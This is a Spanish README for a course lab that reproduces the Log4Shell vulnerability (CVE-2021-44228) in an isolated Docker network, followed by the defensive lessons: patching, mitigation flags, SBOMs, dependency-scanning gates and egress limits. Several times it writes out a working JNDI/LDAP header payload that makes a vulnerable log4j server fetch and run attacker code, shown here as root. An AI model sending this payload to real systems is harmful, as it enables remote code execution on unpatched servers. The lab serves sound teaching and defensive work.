# Log4Shell contenido · CVE-2021-44228

Reproducción **autocontenida** del incidente que abrió la sesión 4: una línea en
una librería de logs transitiva permitía ejecución remota de código (RCE) en
medio internet. Aquí lo reproducimos en una red Docker **aislada**, se observa el
RCE sin exfiltrar nada, y se cierra con la lección defensiva.

> ⚠️ **Scope y legalidad.** Esto es software **deliberadamente vulnerable**. Corre
> solo en tu máquina, en una red Docker `internal: true` (sin salida a internet).
> **Nunca** lo expongas a una red ni lo apuntes a infraestructura de terceros
> (Ley 1273 de 2009). El payload es inofensivo: escribe un archivo dentro del
> propio contenedor víctima.

## Cómo funciona (la cadena del ataque)

```
  trigger (curl)                 victim (log4j 2.14.1)        attacker-ldap        attacker-http
  --------------                 --------------------         -------------        -------------
  X-Api-Version:         ──────▶ log.info("...{}", v)
  ${jndi:ldap://                 evalúa el lookup ${jndi:}
   attacker-ldap:1389/           ──── consulta JNDI/LDAP ───▶ responde un
   Exploit}                                                   "referido" a ─────▶ sirve Exploit.class
                                 descarga y carga la clase ◀──────────────────── (HTTP :8888)
                                 ejecuta Exploit.<clinit>()
                                 → /bin/sh -c 'id > /tmp/pwned.txt'   ← RCE
```

Todo ocurre **dentro de la red `lab`** de Docker. La red es `internal: true`: los
contenedores no pueden alcanzar internet, así que no hay forma de que el payload
se comunique hacia afuera. El impacto se evidencia con un archivo en la víctima.

## Requisitos (Ubuntu / Debian)

Solo Docker. Instálalo una vez y añade tu usuario al grupo `docker`:

```bash
sudo apt update && sudo apt install -y docker.io docker-compose-plugin git
sudo usermod -aG docker $USER      # cierra sesión y vuelve a entrar
docker run --rm hello-world         # verifica que Docker funciona
```
*(En macOS: Docker Desktop. En Kali: Docker ya viene; ver la sección final.)*

## Obtener el lab

```bash
git clone https://github.com/Hackwy402/desarrollo-seguro-ucp
cd desarrollo-seguro-ucp/seclab/labs/01-log4shell
```

## Reproducir — la vía fácil (un comando)

Desde la raíz de `seclab/`:

```bash
cd ~/desarrollo-seguro-ucp/seclab
make demo LAB=01-log4shell     # build + exploit + evidencia + contención + down
```

## Reproducir — paso a paso (para entenderlo)

```bash
cd ~/desarrollo-seguro-ucp/seclab/labs/01-log4shell

# 1) Construir y levantar víctima + atacante (LDAP + HTTP)
docker compose up -d --build
docker compose ps        # victim, l4s-ldap, l4s-http arriba

# 2) Disparar el ataque desde dentro de la red (una sola línea)
docker compose run --rm trigger -s \
  -H 'X-Api-Version: ${jndi:ldap://attacker-ldap:1389/Exploit}' \
  http://victim:8080/

# 3) Comprobar el RCE: el payload corrió DENTRO de la víctima
docker compose exec victim cat /tmp/pwned.txt
```

> Scripts incluidos para la clase:
> - `./exploit.sh` — disparo + evidencia + prueba de contención.
> - `./comparar.sh` — benigna vs payload: **las dos dan HTTP 200**, solo una deja rastro.
> - `FORENSE.md` — guía forense desde la shell (vector, causa raíz, timeline, IOCs).
> - `./demo-log4shell.sh` — la lección defensiva: SBOM → cruce con CVEs → fix a 2.17.1.

Salida esperada del paso 3:

```
=== RCE via Log4Shell (CVE-2021-44228) ===
uid=0(root) gid=0(root) groups=0(root)
l4s-victim
<fecha>
```

Ese archivo lo escribió **código que el atacante eligió**, ejecutado por la JVM de
la víctima. Eso es RCE: nunca subiste un binario, solo mandaste una cabecera HTTP.

> En los logs de la víctima verás un `ClassCastException: Exploit cannot be cast to
> ObjectFactory`. **Es normal y no significa que falló:** el payload corre en el
> bloque estático `static {}` al cargar la clase, *antes* de que JNDI intente
> castearla. El archivo `/tmp/pwned.txt` lo confirma.

Para ver la víctima procesando el lookup, en otra terminal:
```bash
docker compose logs -f victim
```

### Limpiar
```bash
docker compose down -v
```

## La lección defensiva (lo que de verdad importa)

El RCE es el gancho; esto es el contenido de la sesión 4.

| Defensa | Qué hacer | Por qué |
|---|---|---|
| **Parchear** | Subir log4j a **2.17.1+** (o 2.3.2 / 2.12.4 según la rama de Java) | El fix real. Las versiones ≥ 2.16 desactivan los lookups JNDI. |
| **Mitigación rápida** | `-Dlog4j2.formatMsgNoLookups=true` o quitar la clase `JndiLookup` del jar | Cuando no puedes parchear ya mismo. No es sustituto del parche. |
| **SBOM** | Generar y guardar la lista de materiales (CycloneDX/SPDX) | Log4Shell fue tan grave porque **nadie sabía que usaba log4j**. Con SBOM, un `grep` responde «¿me toca?». |
| **SCA en el gate** | `osv-scanner` / el gate de la sesión 4 bloquea una dependencia con CVE conocida | Un PR que introduzca log4j 2.14.1 se bloquea antes del merge. |
| **Mínimo egress** | La app no debería poder abrir conexiones LDAP salientes arbitrarias | Sin salida a internet, el `${jndi:ldap://externo}` no resuelve. (Es lo que hace `internal: true` aquí.) |

### Probar el parche (opcional)
Cambia en `victim/pom.xml` la versión de log4j a `2.17.1`, reconstruye y repite el
disparo: el lookup ya **no** se evalúa y `/tmp/pwned.txt` no se crea.

```bash
# tras editar pom.xml a 2.17.1
docker compose up -d --build victim
docker compose run --rm trigger -s -H 'X-Api-Version: ${jndi:ldap://attacker-ldap:1389/Exploit}' http://victim:8080/
docker compose exec victim cat /tmp/pwned.txt   # -> No such file: el ataque falló
```

### Cómo lo atrapa el gate
Esta misma vulnerabilidad, en un PR, la bloquea el control `deps` del gate
(osv-scanner cruza contra OSV). La demo de hoy y este lab cierran el mismo
círculo: **el incidente que no tenía SBOM, hoy es un hallazgo que no pasa el gate.**

## En Kali (el contenedor que ya tienes)

Mismo flujo; Kali ya trae Docker:

```bash
# dentro de Kali, con Docker corriendo
git clone https://github.com/Hackwy402/desarrollo-seguro-ucp
cd desarrollo-seguro-ucp/seclab/labs/01-log4shell
docker compose up -d --build
docker compose run --rm trigger -s -H 'X-Api-Version: ${jndi:ldap://attacker-ldap:1389/Exploit}' http://victim:8080/
docker compose exec victim cat /tmp/pwned.txt
docker compose down -v
```

Si Docker-in-Docker da guerra en tu Kali, córrelo en el host (Docker Desktop):
el lab es idéntico y la red sigue aislada.

## Estructura

```
log4shell/
├─ docker-compose.yml        red interna + 4 servicios
├─ victim/                   app log4j 2.14.1 (vulnerable), JDK 8u181
├─ attacker-ldap/            marshalsec: servidor LDAP de referidos
└─ attacker-http/            sirve Exploit.class (payload inofensivo)
```
